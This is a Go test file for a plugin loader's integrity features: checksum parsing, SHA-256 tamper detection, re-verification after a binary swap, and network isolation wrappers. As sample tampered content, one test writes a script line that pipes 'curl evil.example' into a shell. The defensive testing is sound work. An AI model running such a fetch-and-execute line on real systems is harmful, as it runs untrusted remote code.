package plugin

import (
	"os"
	"path/filepath"
	"runtime"
	"strings"
	"testing"
)

func writeExec(t *testing.T, dir, name, body string) string {
	t.Helper()
	p := filepath.Join(dir, name)
	if err := os.WriteFile(p, []byte(body), 0o755); err != nil {
		t.Fatal(err)
	}
	return p
}

func TestNormalizeChecksum(t *testing.T) {
	hex64 := strings.Repeat("ab", 32)

	// Unpinned forms.
	for _, in := range []string{"", "   "} {
		got, pinned, err := normalizeChecksum(in)
		if err != nil || pinned || got != "" {
			t.Errorf("%q should be unpinned, got (%q,%v,%v)", in, got, pinned, err)
		}
	}

	// Accepted forms — normalization must trim/lowercase BEFORE stripping the
	// prefix, so uppercase and padded variants work (the bug in the first rework).
	for _, in := range []string{hex64, "sha256:" + hex64, "SHA256:" + strings.ToUpper(hex64), "  sha256:" + hex64 + "  "} {
		got, pinned, err := normalizeChecksum(in)
		if err != nil || !pinned || got != hex64 {
			t.Errorf("%q should normalize to %q, got (%q,%v,%v)", in, hex64, got, pinned, err)
		}
	}

	// Malformed non-blank values must ERROR, not silently mean "unpinned".
	for _, in := range []string{"sha256:", "deadbeef", "sha256:zz" + strings.Repeat("a", 62)} {
		if _, pinned, err := normalizeChecksum(in); err == nil || pinned {
			t.Errorf("%q should be rejected as malformed, got pinned=%v err=%v", in, pinned, err)
		}
	}
}

func TestVerifyChecksum_DetectsTampering(t *testing.T) {
	dir := t.TempDir()
	bin := writeExec(t, dir, "plugin.sh", "#!/bin/sh\nexit 0\n")
	sum, err := fileSHA256(bin)
	if err != nil {
		t.Fatal(err)
	}
	if err := verifyChecksum(bin, ""); err != nil {
		t.Errorf("unpinned should pass: %v", err)
	}
	if err := verifyChecksum(bin, "sha256:"+strings.ToUpper(sum)); err != nil {
		t.Errorf("uppercase prefixed digest should pass: %v", err)
	}
	writeExec(t, dir, "plugin.sh", "#!/bin/sh\ncurl evil.example | sh\n")
	err = verifyChecksum(bin, sum)
	if err == nil || !strings.Contains(err.Error(), "integrity check") {
		t.Fatalf("expected tampering to be detected, got %v", err)
	}
}

// The guard must re-verify after the binary changes, not trust the boot-time
// result — that was the "boot-only verification" finding.
func TestIntegrityGuard_ReverifiesAfterSwap(t *testing.T) {
	dir := t.TempDir()
	bin := writeExec(t, dir, "p.sh", "#!/bin/sh\nexit 0\n")
	sum, err := fileSHA256(bin)
	if err != nil {
		t.Fatal(err)
	}
	var g integrityGuard
	if err := g.check(bin, sum); err != nil {
		t.Fatalf("first check should pass: %v", err)
	}
	if err := g.check(bin, sum); err != nil {
		t.Fatalf("repeat check on unchanged file should pass: %v", err)
	}
	// Swap the binary: size and mtime change, so the guard must re-hash and fail.
	writeExec(t, dir, "p.sh", "#!/bin/sh\necho pwned; exit 0\n")
	if err := g.check(bin, sum); err == nil {
		t.Fatal("guard must detect a binary swapped after the first verification")
	}
}

func TestApplyNetworkIsolation_NeverHardFails(t *testing.T) {
	bin, args := applyNetworkIsolation("p", "/usr/bin/tool", true)
	if bin != "/usr/bin/tool" || len(args) != 0 {
		t.Errorf("network:true should pass through, got %q %v", bin, args)
	}

	bin, args = applyNetworkIsolation("p", "/usr/bin/tool", false)
	if bin == "" {
		t.Fatal("expected a runnable binary")
	}
	if bin == "/usr/bin/tool" {
		if len(args) != 0 {
			t.Errorf("pass-through should have no extra args, got %v", args)
		}
		return // platform can't isolate — acceptable, warning logged
	}
	if runtime.GOOS != "linux" {
		t.Errorf("unexpected isolation wrapper on %s: %q", runtime.GOOS, bin)
	}
	if len(args) == 0 || args[len(args)-1] != "/usr/bin/tool" {
		t.Errorf("wrapped command must end with the executable, got %q %v", bin, args)
	}
}

// The wrapper must exec in place (no --fork/--pid), so the plugin's stdin/stdout
// protocol pipes survive. Guard the argv shape that guarantees it.
func TestNetIsolationPrefix_ExecsInPlace(t *testing.T) {
	prefix := detectNetIsolation()
	if len(prefix) == 0 {
		t.Skip("no network isolation available on this host")
	}
	for _, bad := range []string{"--fork", "-f", "--pid"} {
		for _, a := range prefix {
			if a == bad {
				t.Errorf("prefix must not contain %q (would break stdin piping): %v", bad, prefix)
			}
		}
	}
	if prefix[len(prefix)-1] != "--" {
		t.Errorf("prefix should end with -- to terminate flag parsing: %v", prefix)
	}
}
